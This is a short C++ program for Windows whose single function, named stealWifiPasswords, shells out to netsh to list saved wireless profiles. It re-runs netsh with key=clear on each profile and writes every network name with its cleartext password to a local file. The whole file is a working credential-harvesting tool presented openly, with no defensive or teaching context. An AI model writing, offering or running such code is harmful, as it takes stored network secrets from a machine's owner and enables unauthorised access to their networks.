#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <cstdio>
#include <cstdlib>
#include <sstream>
#include <array>
#include <stdexcept>
#include <iomanip>

using namespace std;

void stealWifiPasswords()
{
    std::string wifi_passwords_filename = "wifi.txt";
    std::ofstream file(wifi_passwords_filename, std::ios::out | std::ios::app);
    if (!file)
    {
        throw std::runtime_error("Error opening file");
    }

    std::cout << "Created file and starting to save wifi passwords to it -> " << wifi_passwords_filename << std::endl;
    std::cout << "Running command: `netsh wlan show profiles`" << std::endl;

    std::string command = "netsh wlan show profiles";
    std::array<char, 128> buffer{};
    std::string data;
    FILE *pipe = _popen(command.c_str(), "r");
    if (!pipe)
    {
        throw std::runtime_error("popen() failed");
    }
    while (fgets(buffer.data(), 128, pipe) != nullptr)
    {
        data += buffer.data();
    }
    _pclose(pipe);

    std::vector<std::string> profiles;
    std::stringstream ss(data);
    std::string line;
    while (std::getline(ss, line))
    {
        if (line.find("All User Profile") != std::string::npos)
        {
            std::string profile = line.substr(line.find(":") + 2, line.length() - 1);
            profiles.push_back(profile);
        }
    }

    std::cout << "Found a total of " << profiles.size() << " WiFi networks" << std::endl;

    for (const auto &i : profiles)
    {
        try
        {
            std::string command = "netsh wlan show profile " + i + " key=clear";
            std::cout << "Running command: `" << command << "`" << std::endl;
            std::array<char, 128> buffer{};
            std::string results;
            FILE *pipe = _popen(command.c_str(), "r");
            if (!pipe)
            {
                throw std::runtime_error("popen() failed");
            }
            while (fgets(buffer.data(), 128, pipe) != nullptr)
            {
                results += buffer.data();
            }
            _pclose(pipe);

            std::vector<std::string> keys;
            std::stringstream ss(results);
            std::string line;
            while (std::getline(ss, line))
            {
                if (line.find("Key Content") != std::string::npos)
                {
                    std::string key = line.substr(line.find(":") + 2, line.length() - 1);
                    keys.push_back(key);
                }
            }

            if (!keys.empty())
            {
                std::cout << "Found password of " << i << " wifi network" << std::endl;
                file << std::left << std::setw(30) << i << "|  " << keys[0] << std::endl;
            }
            else
            {
                std::cout << "Unable to get the password of " << i << " network. No password is available -> by Running `netsh wlan show profile " << i << " key=clear`" << std::endl;
                file << std::left << std::setw(30) << i << "|  "
                     << "" << std::endl;
            }
        }
        catch (const std::exception &ex)
        {
            std::cout << "Unable to get the wifi password of " << i << " network -> " << ex.what() << std::endl;
            file << std::left << std::setw(30) << i << "|  "
                 << "ENCODING ERROR" << std::endl;
        }
    }

    std::cout << "Saved all wifi password to " << wifi_passwords_filename << std::endl;
}

int main()
{
    // system("ipconfig /all > output.txt");
    stealWifiPasswords();
    cout << "Ended" << endl;
    return 0;
}
